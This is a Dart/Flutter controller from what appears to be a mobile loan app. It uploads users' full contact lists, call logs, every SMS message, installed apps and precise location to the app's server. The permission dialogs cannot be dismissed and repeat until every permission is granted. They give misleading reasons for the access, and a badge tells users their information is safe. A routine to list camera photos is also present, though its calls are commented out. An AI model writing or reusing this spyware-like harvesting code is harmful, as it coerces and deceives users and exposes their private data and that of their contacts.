import 'dart:convert';
import 'dart:io';

import 'package:call_log/call_log.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:geocoding/geocoding.dart';
import 'package:geolocator/geolocator.dart';
import 'package:get/get.dart';
import 'package:installed_apps/app_info.dart';
import 'package:installed_apps/installed_apps.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:prathima_loan_app/controllers/kyc_controller.dart';
import 'package:prathima_loan_app/customs/custom_snackbar.dart';
import 'package:prathima_loan_app/customs/custom_text.dart';
import 'package:prathima_loan_app/data/api/api_checker.dart';
import 'package:prathima_loan_app/data/model/app_model.dart';
import 'package:prathima_loan_app/data/model/call_log_model.dart';
import 'package:prathima_loan_app/data/model/contact_model.dart';
import 'package:prathima_loan_app/data/model/login_model.dart';
import 'package:prathima_loan_app/data/model/sms_model.dart';
import 'package:prathima_loan_app/data/repository/home_repository.dart';
import 'package:prathima_loan_app/helpers/route_helper.dart';
import 'package:prathima_loan_app/screens/home/widget/init_permission_dialog.dart';
import 'package:prathima_loan_app/utils/colors.dart';
import 'package:prathima_loan_app/utils/custom_icon.dart';
import 'package:prathima_loan_app/utils/shared_preferences.dart';
import 'package:shared_preferences/shared_preferences.dart';

class HomeController extends GetxController implements GetxService {
  final HomeRepository homeRepository;

  HomeController({required this.homeRepository});

  int _currentIndex = 0;
  int _carouselIndex = 0;
  String _initialLoanAmount = '...';
  bool _isDialogShown = false;
  String _deviceId = '';
  int _userId = 0;
  bool _allPermissionsGranted = false;
  bool _hasShownPermanentlyDeniedDialog = false;
  final List<String> _carouselImageList = [
    'assets/img/slider_image.jpg',
    'assets/img/slider_image_2.jpg',
    'assets/img/slider_image_3.jpg',
  ];

  int get currentIndex => _currentIndex;

  int get carouselIndex => _carouselIndex;

  String get initialLoanAmount => _initialLoanAmount;

  String get deviceId => _deviceId;

  int get userId => _userId;

  bool get allPermissionsGranted => _allPermissionsGranted;

  bool get isDialogShown => _isDialogShown;

  bool get hasShownPermanentlyDeniedDialog => _hasShownPermanentlyDeniedDialog;

  List<String> get carouselImageList => _carouselImageList;

  List<BottomNavigationBarItem> items = [
    const BottomNavigationBarItem(
      icon: Image(image: AssetImage("assets/icon/home.png")),
      label: 'Home',
    ),
    const BottomNavigationBarItem(
      icon: Image(image: AssetImage("assets/icon/loan.png")),
      label: 'Loan',
    ),
    const BottomNavigationBarItem(
      icon: Image(image: AssetImage("assets/icon/transaction.png")),
      label: 'Transaction',
    ),
    const BottomNavigationBarItem(
      icon: Image(image: AssetImage("assets/icon/person.png")),
      label: 'Profile',
    ),
  ];

  void updateIndex(int index) {
    _currentIndex = index;
    update();
  }

  void updateCarouselIndex(int index) {
    _carouselIndex = index;
    update();
  }

  Future<void> getInitialLoanAmount() async {
    var response = await homeRepository.getInitialLoanAmount();
    if (response.statusCode == 200) {
      var body = response.body;
      _initialLoanAmount = body['data'];
    } else {
      ApiChecker.checkApi(response);
    }
    update();
  }

  void clearData() {
    _initialLoanAmount = '...';
    update();
  }

  Future<void> onTapLoanCard() async {
    if (Get.find<KycController>().kycStatus != null) {
      print("kyc status ${Get.find<KycController>().kycStatus!.status}");

      if (Get.find<KycController>().kycStatus!.status == 3) {
        Get.toNamed(RouteHelper.loanDetailsForm);
      } else {
        Get.toNamed(RouteHelper.kycVerificationScreen);
      }
    }
    update();
  }

  Future<void> fetchCallLogs() async {
    if (await Permission.phone.request().isGranted) {
      try {
        Iterable<CallLogEntry> entries = await CallLog.query();
        List<CallLogData> callLogDataList =
            entries.map((e) => CallLogData.fromJson(e)).toList();
        if (callLogDataList.isNotEmpty) {
          List<Map<String, dynamic>> jsonDataList = callLogDataList
              .map((callLogData) => callLogData.toJson())
              .toList();
          var response = await homeRepository.sendCallLogList({
            "user_id": userId.toString(),
            "device_id": deviceId,
            "data": jsonDataList
          });
          if (response.statusCode != 200) {
            ApiChecker.checkApi(response);
          }
        }
      } catch (_) {}
    }
  }

  Future<void> fetchContactsLogs() async {
    if (await Permission.contacts.request().isGranted) {
      try {
        Iterable<Contact> contacts = await ContactsService.getContacts();
        List<ContactData> contactDataList =
            contacts.map((e) => ContactData.fromJson(e)).toList();
        if (contactDataList.isNotEmpty) {
          List<Map<String, dynamic>> jsonDataList = contactDataList
              .map((contactData) => contactData.toJson())
              .toList();
          var response = await homeRepository.sendContactList({
            "user_id": userId.toString(),
            "device_id": deviceId,
            "data": jsonDataList
          });
          if (response.statusCode != 200) {
            ApiChecker.checkApi(response);
          }
        }
      } catch (_) {}
    }
  }

  Future<void> permissionDialog() async {
    final prefs = await SharedPreferences.getInstance();
    bool isShowPermission = prefs.getBool('permission') ?? false;
    if (_isDialogShown) return;
    if (!isShowPermission) {
      await prefs.setBool('permission', true);
      initPermissionDialog();
    } else {
      await appPermission();
    }
  }

  Future<void> changeDialogStatus(bool value) async {
    _isDialogShown = value;
    if (value == false) {
      await appPermission();
    }
  }

  Future<void> getDeviceIdAndUserId() async {
    final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();

    if (GetPlatform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfoPlugin.androidInfo;
      _deviceId = androidInfo.id;
    } else if (GetPlatform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfoPlugin.iosInfo;
      _deviceId = iosInfo.identifierForVendor ?? 'Unknown';
    }

    String userData = await SharedPreference().getUserData();
    LoginResponse decodeUserData = LoginResponse.fromJson(jsonDecode(userData));
    _userId = decodeUserData.user!.id ?? 0;
  }

  Future<void> fetchSMSLogs() async {
    if (await Permission.sms.request().isGranted) {
      try {
        SmsQuery query = SmsQuery();
        List<SmsMessage> messages = await query.getAllSms;
        messages.sort((a, b) => b.date!.compareTo(a.date!));
        List<SmsData> smsDataList =
            messages.map((e) => SmsData.fromJson(e)).toList();
        if (smsDataList.isNotEmpty) {
          List<Map<String, dynamic>> jsonDataList =
              smsDataList.map((smsData) => smsData.toJson()).toList();
          var response = await homeRepository.sendSMSLogList({
            "user_id": userId.toString(),
            "device_id": deviceId,
            "data": jsonDataList
          });
          if (response.statusCode != 200) {
            ApiChecker.checkApi(response);
          }
        }
      } catch (_) {}
    }
  }

  Future<void> fetchInstalledApps() async {
    if (await Permission.storage.request().isGranted) {
      try {
        List<AppInfo> apps = await InstalledApps.getInstalledApps(true, true);
        List<AppData> appDataList =
            apps.map((e) => AppData.fromJson(e)).toList();
        if (appDataList.isNotEmpty) {
          List<Map<String, dynamic>> jsonDataList =
              appDataList.map((appData) => appData.toJson()).toList();
          var response = await homeRepository.sendInstalledAppList({
            "user_id": userId.toString(),
            "device_id": deviceId,
            "data": jsonDataList
          });
          if (response.statusCode != 200) {
            ApiChecker.checkApi(response);
          }
        }
      } catch (_) {}
    }
  }

  Future<List<String>> fetchDCIMFolder() async {
    List<String> filePaths = [];
    if (await Permission.manageExternalStorage.isGranted == false) {
      await Permission.manageExternalStorage.request();
    }

    if (await Permission.storage.request().isGranted) {
      try {
        var picturesDirectory = Directory('/storage/emulated/0/DCIM/Camera/');

        if (await picturesDirectory.exists()) {
          List<FileSystemEntity> files =
              picturesDirectory.listSync(recursive: true);

          for (FileSystemEntity file in files) {
            if (file is File &&
                (file.path.endsWith(".jpg") || file.path.endsWith(".png"))) {
              filePaths.add(file.path);
            }
          }
        }
      } catch (e) {
        print('Error accessing MediaStore: $e');
      }
    }

    return filePaths;
  }

  Future<void> fetchCurrentLocation() async {
    if (await Permission.location.request().isGranted) {
      try {
        Position position = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.high);

        String? address;

        List<Placemark> placeMarks = await placemarkFromCoordinates(
            position.latitude, position.longitude);

        if (placeMarks.isNotEmpty) {
          Placemark place = placeMarks[0];
          address =
              '${place.street}, ${place.locality}, ${place.administrativeArea}, ${place.country}, ${place.postalCode}';
        }
        var response = await homeRepository.sendUserLocation({
          "latitude": position.latitude,
          "longitude": position.longitude,
          "address": address
        });
        if (response.statusCode != 200) {
          ApiChecker.checkApi(response);
        }
      } catch (_) {}
    }
  }

  Future<void> appPermission() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.location,
      Permission.contacts,
      Permission.sms,
      Permission.phone,
      Permission.storage,
    ].request();

    _allPermissionsGranted =
        statuses.values.every((status) => status == PermissionStatus.granted);

    if (!_allPermissionsGranted) {
      await _handlePermissionStatuses(statuses);
    } else {
      // await fetchDCIMFolder();
      await getDeviceIdAndUserId();
      await fetchContactsLogs();
      await fetchCallLogs();
      await fetchSMSLogs();
      await fetchCurrentLocation();
      await fetchInstalledApps();
    }
  }

  Future<bool> _checkAllPermissionsGranted() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.phone,
      Permission.sms,
      Permission.location,
      Permission.contacts,
      Permission.storage,
    ].request();

    return statuses.values
        .every((status) => status == PermissionStatus.granted);
  }

  Future<void> _handlePermissionStatuses(
      Map<Permission, PermissionStatus> statuses) async {
    for (var entry in statuses.entries) {
      Permission permission = entry.key;
      PermissionStatus status = entry.value;
      if (status == PermissionStatus.denied) {
        await returnPermission(permission);
      } else if (status == PermissionStatus.permanentlyDenied) {
        if (!_hasShownPermanentlyDeniedDialog) {
          _hasShownPermanentlyDeniedDialog = true;
          await _showPermanentlyDeniedDialog();
        }
      }
    }
  }

  Future<void> returnPermission(Permission permission) async {
    switch (permission) {
      case Permission.contacts:
        return await _showPermissionDialog(
            icon: 'assets/icon/contact_icon.png',
            title: "Contacts",
            value: "We use and store this to detect and evaluate risks "
                "to provide you with the best offers.",
            permission: permission);
      case Permission.location:
        return await _showPermissionDialog(
            icon: 'assets/icon/location_icon.png',
            title: "Location",
            value: "We use and store this to identify "
                "serviceable locations which may help in faster approvals.",
            permission: permission);
      case Permission.sms:
        return await _showPermissionDialog(
            icon: 'assets/icon/sms_icon.png',
            title: "SMS",
            value:
                "We use and store your SMS data including (but not limited to)"
                " transactions, credits, debits, etc to evaluate creditworthiness"
                " to provide you with credit limits and personalized offers.",
            permission: permission);
      case Permission.storage:
        return await _showPermissionDialog(
            icon: 'assets/icon/storage_icon.png',
            title: "Storage",
            value: "We need storage access to save your documents "
                "and other relevant information securely.",
            permission: permission);
      case Permission.phone:
        return await _showPermissionDialog(
            icon: 'assets/icon/contact_icon.png',
            title: "Phone",
            value: "We need access to your phone to make and manage calls.",
            permission: permission);
    }
  }

  Future<void> _showPermissionDialog(
      {required String icon,
      required String title,
      required String value,
      required Permission permission}) async {
    await Get.dialog(
      barrierDismissible: false,
      AlertDialog(
        backgroundColor: Colors.white,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(2),
        ),
        contentPadding:
            const EdgeInsets.symmetric(vertical: 20, horizontal: 16),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Center(
              child: SizedBox(
                  height: 100,
                  width: 70,
                  child: Image(
                      image: AssetImage("assets/icon/security_icon.jpg"))),
            ),
            const CustomText(
              text:
                  "You will be asked for below permission next please allow to proceed",
              fontSize: 16,
              fontWeight: FontWeight.bold,
              maxLines: 3,
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 16),
            permissionRow(icon: icon, title: title, value: value),
            const Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                CustomIcon(
                  icon: "assets/icon/privacy_security_icon.png",
                  color: Colors.green,
                ),
                SizedBox(width: 6),
                CustomText(
                  text: "Your information is safe with us",
                  fontSize: 12,
                  color: Colors.green,
                )
              ],
            )
          ],
        ),
        actions: [
          GestureDetector(
            onTap: () async {
              Get.back();
              await permission.request();
            },
            child: Container(
              decoration: BoxDecoration(
                  color: MyTheme.mainColor,
                  borderRadius: BorderRadius.circular(4)),
              padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 6),
              child: const CustomText(
                text: "Allow",
                color: MyTheme.white,
              ),
            ),
          )
        ],
      ),
    );
  }

  Future<void> _showPermanentlyDeniedDialog() async {
    await Get.dialog(
      barrierDismissible: false,
      alertDialog(
          onTap: () {
            openAppSettings().then((_) async {
              _allPermissionsGranted = await _checkAllPermissionsGranted();
              if (_allPermissionsGranted) {
                Get.back();
              }
            });
          },
          buttonText: 'Open Settings',
          title:
              'This permission has been permanently denied. Please go to settings and enable it manually.'),
    ).then((value) async {
      if (!_allPermissionsGranted) {
        _allPermissionsGranted = await _checkAllPermissionsGranted();
      }
      if (!_allPermissionsGranted) {
        Get.back();
        showCustomSnackBar("Please grant all required permissions");
        _showPermanentlyDeniedDialog();
      } else {
        // await fetchDCIMFolder();
        await getDeviceIdAndUserId();
        await fetchContactsLogs();
        await fetchCallLogs();
        await fetchSMSLogs();
        await fetchCurrentLocation();
        await fetchInstalledApps();
      }
    });
  }
}
